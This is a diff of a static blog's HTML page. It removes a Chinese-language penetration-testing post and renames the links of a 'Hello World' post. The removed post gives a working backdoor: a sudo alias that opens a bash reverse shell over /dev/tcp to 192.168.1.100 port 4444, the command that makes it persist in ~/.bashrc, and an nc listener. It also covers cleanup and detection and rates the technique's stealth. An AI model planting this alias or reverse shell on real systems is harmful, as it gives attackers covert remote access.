@@ -71,57 +71,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-利用alias设置后门" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/09/12/%E5%88%A9%E7%94%A8alias%E8%AE%BE%E7%BD%AE%E5%90%8E%E9%97%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-09-12T10:48:42.094Z" itemprop="datePublished">2025-09-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>#渗透 #Linux #Macos</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>劫持<code>sudo</code>命令（触发反向连接）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设测试机IP为 192.168.1.100，监听端口 4444</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">sudo</span>=<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;&quot;; \sudo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化到 ~/.bashrc</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias sudo=&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;\&quot;; \sudo&#x27;&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
-
-<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>测试机先启动监听（<code>nc -lvp 4444</code>），目标机执行<code>sudo ls</code>，若反向连接成功，测试机可获得目标机的 Shell。</p>
-<h1 id="清理方案"><a href="#清理方案" class="headerlink" title="清理方案"></a>清理方案</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unalias</span> <span class="built_in">sudo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑配置文件，删除异常的alias行</span></span><br><span class="line">vim ~/.bashrc  <span class="comment"># 找到异常行删除</span></span><br><span class="line"><span class="comment"># 保存后重新加载配置</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
-
-<h1 id="优势（适合场景）"><a href="#优势（适合场景）" class="headerlink" title="优势（适合场景）"></a>优势（适合场景）</h1><ul>
-<li><strong>隐蔽性中等</strong>：日常使用中，用户执行<code>ls</code>&#x2F;<code>cd</code>等常用命令时，不会察觉别名背后的额外逻辑（除非主动检查别名）；</li>
-<li><strong>实施成本低</strong>：无需编译恶意程序，仅通过修改 Shell 配置文件即可实现，适合快速植入；</li>
-<li><strong>针对性强</strong>：可针对特定用户（普通用户 &#x2F;root）配置，仅影响目标用户的 Shell 环境；</li>
-<li><strong>功能灵活</strong>：可实现指令记录（日志）、环境劫持（如修改<code>PATH</code>）、触发特定动作（如反向连接）等。</li>
-</ul>
-<h1 id="局限性（风险点）"><a href="#局限性（风险点）" class="headerlink" title="局限性（风险点）"></a>局限性（风险点）</h1><ul>
-<li><strong>依赖 Shell 环境</strong>：仅对配置了别名的 Shell（如<code>bash</code>&#x2F;<code>zsh</code>）生效，切换 Shell（如从<code>bash</code>到<code>sh</code>）或通过非交互 Shell 执行命令时会失效；</li>
-<li><strong>易被检测</strong>：通过<code>alias</code>命令可直接查看所有别名，检查<code>~/.bashrc</code>&#x2F;<code>/etc/bashrc</code>等配置文件也能发现异常；</li>
-<li><strong>权限依赖</strong>：若要影响所有用户（全局别名），需<code>root</code>权限；仅影响当前用户，普通权限即可；</li>
-<li><strong>非持久化（部分场景）</strong>：若用户删除别名或重建 Shell 配置文件，后门会失效（需结合其他持久化手段，如定时任务恢复配置）。</li>
-</ul>
-<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><strong>可行，但仅适合短期、轻量级的指令劫持或日志记录场景</strong>，不适合高隐蔽性、长期持久化需求（需搭配其他技术，如<code>LD_PRELOAD</code>劫持、内核模块等）。在合法测试中，常用于验证目标系统对 “命令别名劫持” 这类基础攻击的防御能力。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/09/12/%E5%88%A9%E7%94%A8alias%E8%AE%BE%E7%BD%AE%E5%90%8E%E9%97%A8/" data-id="cmfgpt9lz00017js621ps83ol" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/09/12/hello-world/" class="article-date">
+    <a href="/2025/09/29d3ef5a6269.html" class="article-date">
   <time class="dt-published" datetime="2025-09-12T10:13:09.629Z" itemprop="datePublished">2025-09-12</time>
 </a>
     
@@ -133,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/09/12/hello-world/">Hello World</a>
+      <a class="p-name article-title" href="/2025/09/29d3ef5a6269.html">Hello World</a>
     </h1>
   
 
@@ -158,7 +110,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/09/12/hello-world/" data-id="cmfgpt9lv00007js68cm02xta" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/09/29d3ef5a6269.html" data-id="cmfgrfx2n0000vus6fkebh042" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -201,11 +153,7 @@
       <ul>
         
           <li>
-            <a href="/2025/09/12/%E5%88%A9%E7%94%A8alias%E8%AE%BE%E7%BD%AE%E5%90%8E%E9%97%A8/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/09/12/hello-world/">Hello World</a>
+            <a href="/2025/09/29d3ef5a6269.html">Hello World</a>
           </li>
         
       </ul>
